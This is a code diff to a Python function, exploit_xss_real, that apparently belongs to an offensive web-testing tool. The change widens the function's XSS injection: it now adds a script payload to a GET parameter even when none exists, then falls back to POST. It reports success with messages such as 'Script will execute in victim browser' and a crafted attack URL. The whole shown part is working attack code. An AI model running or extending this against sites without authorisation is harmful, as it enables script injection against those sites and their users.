@@ -612,15 +612,16 @@ def exploit_xss_real(target, endpoint, vuln):
     payload = vuln.get('payload', '<script>alert("APEX")</script>')
     try:
         parsed = urlparse(endpoint)
-        if parsed.query and param in parse_qs(parsed.query):
-            params = parse_qs(parsed.query)
-            test_params = params.copy()
-            test_params[param] = [payload]
-            new_query = urlencode(test_params, doseq=True)
-            test_url = urlunparse(parsed._replace(query=new_query))
-            r = sess.get(test_url, timeout=5)
-            if payload in r.text:
-                return {'success':True,'message':'XSS payload injected and reflected','details':[f'Payload injected via {param}','Payload confirmed reflected in response','Script will execute in victim browser',f'Crafted URL: {test_url[:100]}...']}
+        # Try GET injection - add parameter to URL
+        params = parse_qs(parsed.query) if parsed.query else {}
+        test_params = params.copy()
+        test_params[param] = [payload]
+        new_query = urlencode(test_params, doseq=True)
+        test_url = urlunparse(parsed._replace(query=new_query))
+        r = sess.get(test_url, timeout=5)
+        if payload in r.text:
+            return {'success':True,'message':'XSS payload injected and reflected','details':[f'Payload injected via {param} (GET)','Payload confirmed reflected in response','Script will execute in victim browser',f'Crafted URL: {test_url[:100]}...']}
+        # Try POST injection
         data = {param: payload}
         r = sess.post(endpoint, data=data, timeout=5)
         if payload in r.text:
